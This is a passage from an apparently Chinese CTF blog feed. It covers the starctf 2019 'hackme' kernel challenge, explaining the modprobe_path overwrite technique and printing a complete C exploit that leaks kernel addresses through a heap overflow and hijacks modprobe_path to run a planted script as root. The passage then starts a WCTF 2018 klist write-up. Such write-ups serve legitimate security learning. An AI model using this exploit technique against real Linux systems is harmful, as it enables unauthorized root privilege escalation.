更准确地说，如果我们对文件签名（又称魔术头）为系统未知的文件调用execve()函数时，它将调用下列函数，并最终调用modprobe</p><p><code>do_execve()</code>=&gt;<code>do_execveat_common()</code>=&gt;<code>bprm_execve()</code>=&gt;<code>exec_binprm()</code>=&gt;<code>search_binary_handler()</code>=&gt;<code>request_module()</code>=&gt;<code>call_modprobe()</code></p><p>所有这些调用最终将执行下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">call_modprobe</span><span class="params">(<span class="keyword">char</span> *module_name, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line"><span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line"><span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line"><span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!argv)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!module_name)</span><br><span class="line"><span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">argv[<span class="number">3</span>] = module_name;<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line"> <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!info)</span><br><span class="line"><span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"></span><br><span class="line">free_module_name:</span><br><span class="line">kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">kfree(argv);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这篇文章中 <a href="https://cv196082.gitee.io/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/">kernel pwn内存任意读写提升权限[2]</a> 提到了call_usermodehelper函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。然而这个函数的定义可以看出来也是调用了call_usermodehelper_setup和call_usermodehelper_exec，所以猜测这一函数也可以达到一样的效果，结果也证明事实确实如此</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>所以我们的思路就是覆盖掉modprobe_path值为我们期望的值即可。</p><p>那么首先还是需要泄露地址，这里泄露堆地址就不再提了，存在向上任意溢出所以随便怎么泄露都可。</p><p>内核基址的读取需要一点猜测的成分在，可知<code>0</code>号内存<code>0xffff88800017a500</code>之前是已经在用的系统块，那么一定存在一些内核的指针。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810154050545.png"                      alt="image-20220810154050545"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810154112166.png"                      alt="image-20220810154112166"                ></p><p>可以看到这上面确实存在一个固定函数地址，所以可以跟他计算出基地值。</p><p>虽然我们可以直接泄露出来modprobe_path的地址，并且实现任意分配堆地址分配到指定位置，但是这样会破坏很多周围的数据，我们的想法肯定是值修改modprobe_path的值，所以我们还需要进一步利用。接下来的思路就是将堆块分配到pool上，那么我们就可以篡改pool上的堆指针为modprobe_path的地址，那我们就可以只修改他的值了，那么现在的问题是怎么获取到pool的值呢？</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810154529735.png"                      alt="image-20220810154529735"                ></p><p>在mod_tree内存的附近处会存留驱动的地址</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810154831475.png"                      alt="image-20220810154831475"                ></p><p>所以我们可以任意堆分配到这里然后泄露出驱动地址，紧接着任意堆分配到pool最后修改pool中的指针为modprobe_path地址，最后修改modprobe_path的值即可</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">char</span> *content;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fp = open(<span class="string">&quot;/dev/hackme&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] open /dev/hackme failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> heap_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> kernel_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> mod_tree_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> mode_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> pool_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> modprobe_path_addr;</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    arg.idx = <span class="number">0</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">1</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">2</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">3</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    arg.idx = <span class="number">1</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30001</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">3</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30001</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x100</span>;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30003</span>, &amp;arg);</span><br><span class="line">    print_hex(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    heap_addr = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    arg.idx = <span class="number">0</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x200</span> + <span class="number">0x28</span>;</span><br><span class="line">    arg.size = <span class="number">0x200</span> - <span class="number">0x28</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30003</span>, &amp;arg);</span><br><span class="line">    print_hex(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    kernel_addr = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf);</span><br><span class="line">    mod_tree_addr = kernel_addr - <span class="number">0x38ae0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf) = mod_tree_addr + <span class="number">0x20</span>;</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x100</span>;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30002</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    arg.idx = <span class="number">5</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">6</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    arg.idx = <span class="number">6</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x8</span>;</span><br><span class="line">    arg.offset = <span class="number">-0x8</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30003</span>, &amp;arg);</span><br><span class="line">    print_hex(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    mode_addr = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf);</span><br><span class="line">    pool_addr = mode_addr + <span class="number">0x2400</span>;</span><br><span class="line"></span><br><span class="line">    arg.idx = <span class="number">5</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30001</span>, &amp;arg);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf) = pool_addr + <span class="number">0x90</span>;</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x100</span>;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30002</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    modprobe_path_addr = mod_tree_addr + <span class="number">0x2e960</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    arg.idx = <span class="number">7</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf) = modprobe_path_addr;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf + <span class="number">1</span>) = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strncpy</span>(buf, <span class="string">&quot;/home/pwn/copy.sh\x00&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    arg.idx = <span class="number">9</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x18</span>;</span><br><span class="line">    arg.offset = <span class="number">0</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30002</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810155109129.png"                      alt="image-20220810155109129"                ></p><p>当然其实在劫持到pool这一步也是可以直接使用 <a href="https://cv196082.gitee.io/2022/08/07/WCTF-2018-klist/">WCTF 2018 klist</a> 这道题的利用方式，利用堆溢出泄漏出cred然后修改cred结构体即可，因为这道题目的漏洞相对来说比较严重，所以ptmx劫持栈什么的都是可以的。这篇文章主要是记录没有遇到过的利用方法。</p><hr><p>参考链接：<a class="link"   href="http://p4nda.top/2019/05/01/starctf-2019-hackme/#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87" >http://p4nda.top/2019/05/01/starctf-2019-hackme/#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;这道题依旧是一道kernel的堆题，题目很简单这里简单分析一下&lt;/p&gt;
&lt;figure class=&quot;highlight c</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="modprobe_path" scheme="https://cv196082.gitee.io/tags/modprobe-path/"/>
    
  </entry>
  
  <entry>
    <title>WCTF 2018 klist</title>
    <link href="https://cv196082.gitee.io/2022/08/07/WCTF-2018-klist/"/>
    <id>https://cv196082.gitee.io/2022/08/07/WCTF-2018-klist/</id>
    <published>2022-08-07T09:42:36.000Z</published>
    <updated>2022-08-07T09:43:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目实现的功能很容易看出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x1338</span> )</span><br><span class="line">        <span class="keyword">return</span> select_item(a1, a3);</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x1338</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x1337</span> )</span><br><span class="line">            <span class="keyword">return</span> add_item(a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x1339</span> )</span><br><span class="line">            <span class="keyword">return</span> remove_item(a3);</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x133A</span> )</span><br><span class="line">            <span class="keyword">return</span> list_head(a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要实现了对堆块的申请，释放，读写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">add_item</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rax</span></span><br><span class="line">    __int64 size; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">    __int64 chunk; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v7, a1, <span class="number">0x10</span>LL) || v7[<span class="number">0</span>] &gt; <span class="number">0x400</span>uLL )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    v1 = _kmalloc(v7[<span class="number">0</span>] + <span class="number">0x18</span>, <span class="number">0x14202C0</span>LL);</span><br><span class="line">    size = v7[<span class="number">0</span>];</span><br><span class="line">    v3 = v7[<span class="number">1</span>];</span><br><span class="line">    *v1 = <span class="number">1</span>;</span><br><span class="line">    chunk = v1;</span><br><span class="line">    *(v1 + <span class="number">8</span>) = size;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v1 + <span class="number">0x18</span>, v3, size) )</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(chunk);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        mutex_lock(&amp;list_lock);</span><br><span class="line">        v5 = g_list;</span><br><span class="line">        g_list = chunk;</span><br><span class="line">        *(chunk + <span class="number">0x10</span>) = v5;</span><br><span class="line">        mutex_unlock(&amp;list_lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里可以分析出申请堆块的参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以及堆块的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    inuse;</span><br><span class="line">    size;</span><br><span class="line">    prev;</span><br><span class="line">    buf;</span><br><span 